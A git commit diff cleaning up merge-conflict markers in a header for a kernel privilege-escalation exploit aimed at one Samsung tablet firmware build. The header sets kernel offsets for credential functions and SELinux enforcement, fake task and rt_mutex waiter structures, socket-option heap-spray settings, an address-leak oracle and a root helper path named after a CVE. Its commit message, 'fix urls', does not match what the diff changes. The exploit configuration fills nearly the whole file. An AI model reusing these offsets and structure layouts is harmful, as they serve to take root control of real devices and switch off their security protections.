ae9a0a83c603407c40282e9b967a67ea0608fb81
asarr22 <msarr3334@gmail.com>
2026-09-07 10:00:33 +0300

    fix urls for gts9fewifi-X510XXSEEZG3 payload

--- src/targets/gts9fewifi-X510XXSEEZG3/target.h
+++ src/targets/gts9fewifi-X510XXSEEZG3/target.h
@@ -1,29 +1,6 @@
 #ifndef OFFSET_H
 #define OFFSET_H
 
-<<<<<<< HEAD
-#if defined(APP_PAYLOAD) && APP_PAYLOAD
-#define BUILD_VARIANT_LABEL "gts9fewifi-X510XXSEEZG3-app-physical-p0-oracle"
-#define APP_PHYS_P0_ORACLE 1
-#else
-#define BUILD_VARIANT_LABEL "gts9fewifi-X510XXSEEZG3-root-umh"
-#endif
-
-#ifndef BUILD_FINGERPRINT
-#define BUILD_FINGERPRINT \
- "samsung/gts9fewifixx/gts9fewifi:16/BP4A.251205.006/X510XXSEEZG3:user/release-keys"
-#endif
-
-#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
-#define P0_PAGE_OFFSET 0xffffff8000000000ULL
-#define P0_PHYS_OFFSET 0x40000000ULL
-#define P0_KERNEL_PHYS_LOAD 0x40000000ULL
-#define SKB_DATA_DELTA (-0x1000LL)
-#define MM_STRUCT_SZ 0x400
-#define MM_ORDER 3
-
-#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
-=======
 /* ---------------------------------------------------------------------------
  * Target identity & build flags
  * ------------------------------------------------------------------------- */
@@ -69,115 +46,20 @@
 #define P0_KERNEL_PHYS_LOAD 0x80000000ULL
 #endif
 
->>>>>>> b7a854e (V4: FPSIMD route fully working on gts9fewifi-X510XXSEEZG3)
 #define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
 #define DIRECT_MAP_BASE 0xffffff8000000000ULL
 #define DIRECT_MAP_END 0xffffff9000000000ULL
 #define VMEMMAP_START 0xfffffffe00000000ULL
 
-<<<<<<< HEAD
-#define TASK_STRUCT_CRED_OFF      0x798ULL
-#define TASK_STRUCT_REAL_CRED_OFF 0x790ULL
-#define FAKE_TASK_TASK_GROUP_OFF  0x400ULL
-
-#define INIT_TASK_OFF             0x0239fd80ULL      // unchanged
-// Credential offsets – corrected from EZG3 ELF
-#define PREPARE_KERNEL_CRED_OFF   0x00113a88ULL      // was 0x0011e3c8
-#define COMMIT_CREDS_OFF          0x00113330ULL      // was 0x00120104
-#define OVERRIDE_CREDS_OFF        0x00113718ULL      // was 0x0011f1dc
-
-#define ROOT_TASK_GROUP_OFF       0x02591f40ULL      // unchanged
-#define SELINUX_ENFORCING_OFF     0x026654e8ULL      // unchanged
-#define KMALLOC_CACHES_OFF        0x01b04c70ULL      // +0xc0
-#define ANON_PIPE_BUF_OPS_OFF     0x01912de0ULL      // +0xc0
-#define SYSTEM_UNBOUND_WQ_OFF     0x0238ae20ULL      // unchanged
-#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00100eecULL // unchanged
-
-#define ASHMEM_FOPS_OFF           0x01ab3c08ULL      // +0xc0
-#define ASHMEM_MISC_FOPS_OFF      0x024ff750ULL      // TODO: verify (old value)
-#define ASHMEM_IOCTL_OFF          0x00d026c0ULL      // unchanged
-#define ASHMEM_COMPAT_IOCTL_OFF   0x00d02c78ULL      // unchanged
-#define ASHMEM_MMAP_OFF           0x00d02cd0ULL      // unchanged
-#define ASHMEM_OPEN_OFF           0x00d02f0cULL      // unchanged
-#define ASHMEM_RELEASE_OFF        0x00d02f90ULL      // unchanged
-#define ASHMEM_SHOW_FDINFO_OFF    0x00d030b0ULL      // unchanged
-
-#define CONFIGFS_READ_ITER_OFF    0x004759c4ULL      // unchanged
-#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00475e80ULL    // unchanged
-#define COPY_SPLICE_READ_OFF      0x003fcb5cULL      // unchanged
-#define NOOP_LLSEEK_OFF           0x003b1d24ULL      // unchanged
-
-#define SLIDE_FAKE_WAITER_PRIO 0
-#define SLIDE_WAITER_WAKE_STATE 0
-#define SLIDE_LOCK_OWNER_VALUE 1ULL
-#define SLIDE_USE_FAKE_TASK 1
-#define COMPACT_RT_MUTEX_WAITER 1
-#define SLIDE_TRACEFS_EVENT_ID 108                    
-#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x00108668ULL 
-#define SLIDE_PSELECT_WORD_SHIFT 3
-
-#define SLIDE_USE_SETSO_SPRAY 1
-#define SLIDE_SETSO_SPRAY_FAMILY AF_INET6
-#define SLIDE_SETSO_SPRAY_LEVEL 0x29
-#define SLIDE_SETSO_SPRAY_OPTNAME 43
-#define SLIDE_SETSO_SPRAY_COPY_LEN 0x108
-
-#define SLIDE_P0_OFFSET_CANDIDATES \
- 0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
- 0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
- 0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
- 0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
- 0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
- 0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
- 0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
- 0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL
-#define SLIDE_MAX_ATTEMPTS 32
-
-#define SLIDE_NFULNL_LOGGER_NAME_OFF     0x00ec8518ULL   // new (derived)
-#define SLIDE_NFULNL_LOGGER_OBJECT_OFF   0x023925a0ULL   // unchanged
-#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x024be6f8ULL // TODO: verify (old value)
-#define SLIDE_SYSCTL_BOOTID_OFF          0x0274a5c9ULL   // unchanged
-#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
-
-#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
-#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
-#define SLIDE_NFULNL_LOGGER_NAME_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
-#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
-#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
-#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
-#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
-#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
-
-#if defined(APP_PAYLOAD) && APP_PAYLOAD
-#define ROUTE_WAIT_SECONDS 8
-#define PSELECT_ENTER_DELAY_USEC 50000
-#define SLIDE_PSELECT_TIMEOUT_NSEC 100000000L
-#define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
-#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
-#define SLIDE_KSNITCH_AVERAGE 8
-#define SLIDE_BANK_SLOTS 4
-#define SLIDE_BANK_TASK_OFF 0x1000
-#define SLIDE_BANK_TASK_STRIDE 0x1c0
-#define SLIDE_BANK_LOCK_OFF 0x5200
-#define SLIDE_BANK_SLOT_STRIDE 0x100
-#define SLIDE_BANK_WAITER_OFF 0x40
-=======
 /* ---------------------------------------------------------------------------
  * P0 physical oracle (configfs gate/probe slots)
  * ------------------------------------------------------------------------- */
->>>>>>> b7a854e (V4: FPSIMD route fully working on gts9fewifi-X510XXSEEZG3)
 #define P0_ORACLE_GATE_SLOT 0
 #define P0_ORACLE_PROBE_SLOT 1
 #define P0_ORACLE_GATE_RESTORE_SLOT 2
 #define P0_ORACLE_PROBE_RESTORE_SLOT 3
 #define P0_ORACLE_GATE_PAGE_OFF 0x0e80
 #define P0_ORACLE_GATE_OBJECT_INDEX 1
-<<<<<<< HEAD
-#define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL          // must be tuned on device
-#define P0_FINGERPRINT_HEADER "targets/gts9fewifi-X510XXSEEZG3/p0_fingerprint.h"
-#endif
-
-=======
 #define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
 #define P0_FINGERPRINT_HEADER \
   "targets/gts9fewifi-X510XXSEEZG3/p0_fingerprint.h"
@@ -285,7 +167,6 @@
  * Derived image addresses (KIMAGE_TEXT_BASE + offset)
  * ------------------------------------------------------------------------- */
 /* --- global / root symbols ------------------------------------------------ */
->>>>>>> b7a854e (V4: FPSIMD route fully working on gts9fewifi-X510XXSEEZG3)
 #define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
 #define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
 #define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
@@ -294,38 +175,20 @@
 #define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
 #define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
 
-<<<<<<< HEAD
-#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
-#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
-=======
 /* --- ashmem / configfs / fops gadgets ------------------------------------- */
 #define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
 #define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
->>>>>>> b7a854e (V4: FPSIMD route fully working on gts9fewifi-X510XXSEEZG3)
 #define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
 #define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
 #define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
 #define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
 #define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
 #define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
-<<<<<<< HEAD
-
-=======
->>>>>>> b7a854e (V4: FPSIMD route fully working on gts9fewifi-X510XXSEEZG3)
 #define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
 #define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
 #define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
 #define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
 
-<<<<<<< HEAD
-#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
-#define ROOT_UMH_WORK_OFF 0x6000
-#define ROOT_UMH_DATA_OFF 0x6200
-
-#define LOCK_OFF 0x2210
-#define W0_OFF 0x2350
-#define FOPS_OFF 0x2000
-=======
 /* --- slide leak symbols ---------------------------------------------------- */
 #define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
   (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
@@ -345,16 +208,12 @@
 #define LOCK_OFF 0x2210
 #define W0_OFF 0x2350
 #define FOPS_OFF 0x7000
->>>>>>> b7a854e (V4: FPSIMD route fully working on gts9fewifi-X510XXSEEZG3)
 #define SCRATCH_OFF 0x3000
 #define RIGHT_OFF 0x4440
 #define LEFT_OFF 0x5550
 #define FAKE_TASK_OFF 0x3200
 
-<<<<<<< HEAD
-=======
 /* --- fake rt_mutex_waiter layout ------------------------------------------ */
->>>>>>> b7a854e (V4: FPSIMD route fully working on gts9fewifi-X510XXSEEZG3)
 #define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
 #define FAKE_WAITER_TASK_OFF 0x30
 #define FAKE_WAITER_LOCK_OFF 0x38
@@ -362,13 +221,8 @@
 #define FAKE_WAITER_PRIO_OFF 0x44
 #define FAKE_WAITER_DEADLINE_OFF 0x48
 #define FAKE_WAITER_WW_CTX_OFF 0x50
-<<<<<<< HEAD
-#define FAKE_WAITER_LAYOUT_SIZE 0x58
-
-=======
 
 /* --- fake task_struct layout ---------------------------------------------- */
->>>>>>> b7a854e (V4: FPSIMD route fully working on gts9fewifi-X510XXSEEZG3)
 #define FAKE_TASK_USAGE_OFF 0x38
 #define FAKE_TASK_PRIO_OFF 0x7c
 #define FAKE_TASK_NORMAL_PRIO_OFF 0x84
@@ -377,24 +231,18 @@
 #define FAKE_TASK_PI_TOP_TASK_OFF 0x8a8
 #define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8b0
 
-<<<<<<< HEAD
-=======
 /* ---------------------------------------------------------------------------
  * configfs (configfs_bin_buffer) struct layout
  * ------------------------------------------------------------------------- */
->>>>>>> b7a854e (V4: FPSIMD route fully working on gts9fewifi-X510XXSEEZG3)
 #define CFG_PAGE_OFF 16
 #define CFG_NEEDS_READ_FILL_OFF 80
 #define CFG_BIN_BUFFER_OFF 88
 #define CFG_BIN_BUFFER_SIZE_OFF 96
 #define CFG_CB_MAX_SIZE_OFF 100
 
-<<<<<<< HEAD
-=======
 /* ---------------------------------------------------------------------------
  * workqueue / worker-pool layout
  * ------------------------------------------------------------------------- */
->>>>>>> b7a854e (V4: FPSIMD route fully working on gts9fewifi-X510XXSEEZG3)
 #define WQ_DFL_PWQ_OFF 0xb0
 #define PWQ_POOL_OFF 0x00
 #define PWQ_WQ_OFF 0x08
@@ -406,30 +254,19 @@
 #define POOL_WORKLIST_OFF 0x20
 #define POOL_NR_IDLE_OFF 0x34
 
-<<<<<<< HEAD
-=======
 /* --- work_struct layout ---------------------------------------------------- */
->>>>>>> b7a854e (V4: FPSIMD route fully working on gts9fewifi-X510XXSEEZG3)
 #define WORK_DATA_OFF 0x00
 #define WORK_ENTRY_OFF 0x08
 #define WORK_FUNC_OFF 0x18
 
-<<<<<<< HEAD
-=======
 /* ---------------------------------------------------------------------------
  * struct page layout
  * ------------------------------------------------------------------------- */
->>>>>>> b7a854e (V4: FPSIMD route fully working on gts9fewifi-X510XXSEEZG3)
 #define STRUCT_PAGE_SIZE 0x40
 #define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
 #define STRUCT_SLAB_CACHE_OFF 0x18
 #define STRUCT_PAGE_TYPE_OFF 0x30
 
-<<<<<<< HEAD
-#define PIPE_BUFFER_SLOTS 32
-#define PIPE_BUF_FLAG_CAN_MERGE 0x10
-
-=======
 /* ---------------------------------------------------------------------------
  * pipe buffer
  * ------------------------------------------------------------------------- */
@@ -439,7 +276,6 @@
 /* ---------------------------------------------------------------------------
  * file_operations struct layout
  * ------------------------------------------------------------------------- */
->>>>>>> b7a854e (V4: FPSIMD route fully working on gts9fewifi-X510XXSEEZG3)
 #define FOPS_OWNER_OFF 0x00
 #define FOPS_LLSEEK_OFF 0x08
 #define FOPS_READ_OFF 0x10
@@ -453,9 +289,4 @@
 #define FOPS_RELEASE_OFF 0x80
 #define FOPS_SPLICE_READ_OFF 0xc8
 #define FOPS_SHOW_FDINFO_OFF 0xe0
-<<<<<<< HEAD
-
 #endif
-=======
-#endif
->>>>>>> b7a854e (V4: FPSIMD route fully working on gts9fewifi-X510XXSEEZG3)
